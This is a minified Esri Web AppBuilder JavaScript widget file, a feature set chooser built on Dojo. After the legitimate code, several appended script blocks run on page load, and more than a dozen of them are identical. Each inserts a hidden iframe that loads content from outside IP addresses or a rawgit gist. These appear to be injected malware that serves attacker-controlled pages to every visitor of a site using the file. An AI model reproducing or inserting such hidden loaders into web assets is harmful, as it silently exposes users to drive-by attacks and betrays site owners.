// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/on dojo/Evented dojo/_base/lang dojo/_base/array dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin jimu/dijit/DrawBox jimu/dijit/_FeatureSetChooserCore esri/symbols/jsonUtils".split(" "),function(b,d,a,e,f,g,h,k,l,m,n){return f([g,h,k,d],{baseClass:"jimu-single-layer-featureset-chooser",templateString:"\x3cdiv\x3e\x3c/div\x3e",drawBox:null,map:null,featureLayer:null,updateSelection:!1,postCreate:function(){this.inherited(arguments);var c=n.fromJson({style:"esriSFSSolid",
color:[79,129,189,77],type:"esriSFS",outline:{style:"esriSLSSolid",color:[54,93,141,255],width:1.5,type:"esriSLS"}});this.drawBox=new l({map:this.map,showClear:!0,keepOneGraphic:!0,geoTypes:["EXTENT"]});this.drawBox.setPolygonSymbol(c);c=this.drawBox.getDrawItemIcons();e.forEach(c,a.hitch(this,function(a){a.title=""}));this.drawBox.extentIcon.title=window.jimuNls.spatialFilterByFeatures.drawShapesTip;this.drawBox.placeAt(this.domNode);this.own(b(this.drawBox,"user-clear",a.hitch(this,this._onDrawBoxUserClear)));
this.own(b(this.drawBox,"draw-activate",a.hitch(this,function(){this.emit("draw-activate")})));this.own(b(this.drawBox,"draw-deactivate",a.hitch(this,function(){this.emit("draw-deactivate")})));this.own(b(this.drawBox,"draw-end",a.hitch(this,this._onDrawEnd)));this.featureSetChooserCore=new m({map:this.map,featureLayer:this.featureLayer,drawBox:this.drawBox,updateSelection:this.updateSelection});this.own(b(this.featureSetChooserCore,"loading",a.hitch(this,function(){this.emit("loading")})));this.own(b(this.featureSetChooserCore,
"unloading",a.hitch(this,function(){this.emit("unloading")})));this.own(b(this.featureLayer,"visibility-change",a.hitch(this,function(){this.featureLayer.visible?this.drawBox.enable():this.drawBox.disable()})))},getFeatures:function(){return this.featureSetChooserCore.getFeatures()},syncGetFeatures:function(){return this.featureSetChooserCore.syncGetFeatures()},disable:function(){this.drawBox.disable()},enable:function(){this.drawBox.enable()},deactivate:function(){this.drawBox.deactivate()},clearAllGraphics:function(){this.featureSetChooserCore.clear(!1)},
isLoading:function(){return this.featureSetChooserCore.isLoading()},getFeatureLayer:function(){return this.featureLayer},destroy:function(){this.featureSetChooserCore&&this.featureSetChooserCore.destroy();this.featureSetChooserCore=null;this.inherited(arguments)},_onDrawEnd:function(){this.drawBox.clear()},_onDrawBoxUserClear:function(){this.clearAllGraphics();this.emit("user-clear")},showMiddleFeatureLayer:function(){this.featureSetChooserCore&&this.featureSetChooserCore.showMiddleFeatureLayer()},
hideMiddleFeatureLayer:function(){this.featureSetChooserCore&&this.featureSetChooserCore.hideMiddleFeatureLayer()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});